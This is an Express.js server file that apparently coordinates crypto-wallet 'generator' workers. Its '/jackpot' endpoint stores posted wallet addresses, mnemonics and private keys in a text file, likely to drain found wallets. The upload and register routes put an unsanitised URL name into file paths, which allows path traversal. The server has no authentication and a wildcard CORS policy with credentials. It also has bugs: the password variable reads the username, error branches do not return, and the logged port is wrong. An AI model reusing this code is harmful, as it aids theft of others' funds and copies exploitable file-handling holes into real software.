// DEPENDENCIES

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

// Import the responseApi.js
const { success, errorResponse } = require("./utils/responseApi");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json({limit: '50mb', extended: true}));

app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization");
    next();
});

// Middlewares
const fileUpload = require('express-fileupload');

// enable files upload
app.use(fileUpload({
    createParentPath: true
}));


/**
 * Environment variables
 */

const DB_USERNAME = process.env.DB_USERNAME;
const DB_PASSWORD = process.env.DB_USERNAME;
const HOST = process.env.HOST;
const HTTP_PORT = 3001;


// if(DB_USERNAME == undefined || DB_PASSWORD == undefined || HOST == undefined){
//     throw "Environment parameter missing";
// }

// Prepare connection to database in possible future releases
// var connection = mysql.createConnection({
//     host: host,
//     user: username,
//     password: password,
//     database: database
// });

// connectDB(connection);

// function connectDB (connection){
//     connection.connect(async function (err) {
//         if (err) {
//             connection.end();
//             console.log('Taking a break...');
//             setTimeout(() => {
//                 connectDB(connection)
//             }, 5000)
//         }else{
//             console.log('connected as id ' + connection.threadId);
//         }
//     });
// }
  
app.post('/api/1.0/register/:name', function (req, res) {
    let name = req.params.name;
    if (name == undefined){
        res.status(400).json(errorResponse("You need to pass a name in url", res.statusCode));
    }

    if(fs.existsSync(`./generators/${name}`)){
        res.status(400).json(errorResponse("You are already registered", res.statusCode));
    }

    fs.mkdir(`./generators/${name}`, function(err) {
        if (err) {
            res.status(500).json(errorResponse("Could not create the appropriate directory", res.statusCode));
        } else {
            res.setHeader('Content-Type', 'application/json');
            res
            .status(200)
            .json(success("OK", {"name": name}, res.statusCode));
        }
    })
});


app.post('/api/1.0/jackpot', function (req, res) {
    let address = req.body.address;
    let mnemonic = req.body.mnemonic;
    let private = req.body.private;

    fs.appendFile(`./generators/jackpot/jackpot.txt`, `${address},${mnemonic},${private}\n`, async function (err) {
        if (err) {
            res.status(500).json(errorResponse(err, res.statusCode));
        }
    });

    res.setHeader('Content-Type', 'application/json');
    res
    .status(200)
    .json(success("OK", res.statusCode));
});


app.post('/api/1.0/upload/:name', async (req, res) => {

    let name = req.params.name;
    if (name == undefined){
        res.status(400).json(errorResponse("You need to pass a name in url", res.statusCode));
    }

    try {
        if(!req.files) {
            res.status(400).json(errorResponse("ERROR: No file uploaded", res.statusCode));
        } else {
            // Retrieve file from request. Must be multipart/form-data request
            let upload = req.files.upload;
            
            //Use the mv() method to place the file in upload directory (i.e. "uploads")
            upload.mv('./generators/' + name);

            //send response
            res.setHeader('Content-Type', 'application/json');
            res
            .status(200)
            .json(success("OK", {
                name: upload.name,
                mimetype: upload.mimetype,
                size: upload.size
            }, res.statusCode));
        }
    } catch (err) {
        res.status(500).send(err);
    }
});

app.listen(HTTP_PORT, () => console.log('Master listening on port 3000!'));